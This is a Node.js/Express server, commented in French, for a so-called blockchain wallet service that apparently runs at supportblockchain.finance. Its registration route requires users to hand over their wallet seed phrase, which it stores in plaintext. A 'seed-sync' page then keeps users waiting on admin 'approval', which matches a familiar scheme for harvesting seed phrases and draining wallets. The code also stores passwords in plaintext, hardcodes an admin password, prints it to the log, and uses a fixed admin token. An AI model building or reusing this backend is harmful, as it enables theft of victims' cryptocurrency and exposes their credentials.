const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const mysql = require('mysql2/promise');

const app = express();
const PORT = process.env.PORT || 3000;

console.log('🚀 Portefeuille Blockchain - Démarrage...');

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'frontend')));

// ==================== MYSQL ====================
const pool = mysql.createPool({
    host: process.env.DB_HOST || 'localhost',
    user: process.env.DB_USER || 'u120682741_blockchain_user',
    password: process.env.DB_PASSWORD || '',
    database: process.env.DB_NAME || 'u120682741_blockchain_db',
    waitForConnections: true,
    connectionLimit: 10
});

async function connectDB() {
    try {
        const connection = await pool.getConnection();
        console.log('✅ MySQL connecté');
        connection.release();

        await pool.query(`
            CREATE TABLE IF NOT EXISTS users (
                id INT AUTO_INCREMENT PRIMARY KEY,
                username VARCHAR(255) UNIQUE NOT NULL,
                email VARCHAR(255) UNIQUE NOT NULL,
                password VARCHAR(255) NOT NULL,
                wallet_address VARCHAR(255) UNIQUE NOT NULL,
                seed_phrase TEXT,
                status VARCHAR(50) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        console.log('✅ Table users créée');
        return true;
    } catch (error) {
        console.error('❌ Erreur MySQL:', error.message);
        return false;
    }
}

// ==================== ROUTES ====================

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', message: 'Blockchain Wallet API running' });
});

// Inscription avec seed phrase
app.post('/api/auth/register', async (req, res) => {
    try {
        const { username, email, password, seedPhrase } = req.body;
        if (!username || !email || !password || !seedPhrase) {
            return res.status(400).json({ success: false, error: 'Tous les champs sont requis' });
        }

        const [existing] = await pool.query('SELECT id FROM users WHERE email = ?', [email]);
        if (existing.length > 0) {
            return res.status(400).json({ success: false, error: 'Email déjà utilisé' });
        }

        const walletAddress = `0x${crypto.randomBytes(20).toString('hex')}`;
        const [result] = await pool.query(
            'INSERT INTO users (username, email, password, wallet_address, seed_phrase, status) VALUES (?, ?, ?, ?, ?, ?)',
            [username, email, password, walletAddress, seedPhrase, 'pending']
        );

        const token = `token_${result.insertId}_${Date.now()}`;
        res.json({
            success: true,
            token,
            user: { id: result.insertId, username, email, walletAddress },
            status: 'pending'
        });
    } catch (error) {
        console.error('Erreur inscription:', error);
        res.status(500).json({ success: false, error: 'Erreur serveur' });
    }
});

// Connexion
app.post('/api/auth/login', async (req, res) => {
    try {
        const { email, password } = req.body;
        const [users] = await pool.query('SELECT * FROM users WHERE email = ? AND password = ?', [email, password]);
        if (users.length === 0) {
            return res.status(401).json({ success: false, error: 'Email ou mot de passe incorrect' });
        }
        const user = users[0];
        const token = `token_${user.id}_${Date.now()}`;
        res.json({
            success: true,
            token,
            user: {
                id: user.id,
                username: user.username,
                email: user.email,
                walletAddress: user.wallet_address,
                status: user.status
            }
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Erreur serveur' });
    }
});

// Vérifier le statut d'un utilisateur par seed phrase
app.post('/api/wallet/check-status', async (req, res) => {
    try {
        const { seedPhrase } = req.body;
        if (!seedPhrase) {
            return res.status(400).json({ success: false, error: 'Seed phrase requise' });
        }

        const [users] = await pool.query('SELECT * FROM users WHERE seed_phrase = ?', [seedPhrase]);
        if (users.length === 0) {
            return res.json({ success: true, status: 'pending', message: 'Attente de synchronisation...' });
        }

        const user = users[0];
        res.json({
            success: true,
            status: user.status,
            message: user.status === 'approved' ? '✅ Wallet synchronisé !' : '⏳ Attente de synchronisation...'
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Erreur serveur' });
    }
});

// ==================== ADMIN ====================
const adminEmail = 'admin@blockchain.com';
const adminPassword = 'Admin123!';

app.post('/api/admin/login', (req, res) => {
    const { email, password } = req.body;
    if (email === adminEmail && password === adminPassword) {
        res.json({ success: true, token: 'admin_secret_token' });
    } else {
        res.status(401).json({ success: false });
    }
});

app.get('/api/admin/verify', (req, res) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (token === 'admin_secret_token') {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false });
    }
});

// Récupérer tous les utilisateurs pour l'admin
app.get('/api/admin/users', async (req, res) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (token !== 'admin_secret_token') return res.status(401).json({ success: false });

    const [users] = await pool.query('SELECT id, username, email, wallet_address, status, created_at FROM users ORDER BY created_at DESC');
    res.json({ success: true, users });
});

// Approuver un utilisateur (admin)
app.post('/api/admin/approve-user', async (req, res) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (token !== 'admin_secret_token') return res.status(401).json({ success: false });

    const { userId } = req.body;
    if (!userId) {
        return res.status(400).json({ success: false, error: 'ID utilisateur requis' });
    }

    await pool.query('UPDATE users SET status = ? WHERE id = ?', ['approved', userId]);
    res.json({ success: true, message: 'Utilisateur approuvé avec succès' });
});

// Refuser un utilisateur (admin)
app.post('/api/admin/reject-user', async (req, res) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (token !== 'admin_secret_token') return res.status(401).json({ success: false });

    const { userId } = req.body;
    if (!userId) {
        return res.status(400).json({ success: false, error: 'ID utilisateur requis' });
    }

    await pool.query('UPDATE users SET status = ? WHERE id = ?', ['rejected', userId]);
    res.json({ success: true, message: 'Utilisateur refusé' });
});

// Supprimer un utilisateur (admin)
app.delete('/api/admin/delete-user', async (req, res) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (token !== 'admin_secret_token') return res.status(401).json({ success: false });
    const { userId } = req.body;
    await pool.query('DELETE FROM users WHERE id = ?', [userId]);
    res.json({ success: true });
});

// FRONTEND
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'index.html')));
app.get('/dashboard.html', (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'dashboard.html')));
app.get('/seed-sync.html', (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'seed-sync.html')));
app.get('/admin.html', (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'admin.html')));

// DÉMARRAGE
async function startServer() {
    await connectDB();
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`\n🚀 Portefeuille Blockchain API sur http://0.0.0.0:${PORT}`);
        console.log(`🔐 Admin: ${adminEmail} / ${adminPassword}`);
        console.log(`🌐 https://supportblockchain.finance\n`);
    });
}

startServer();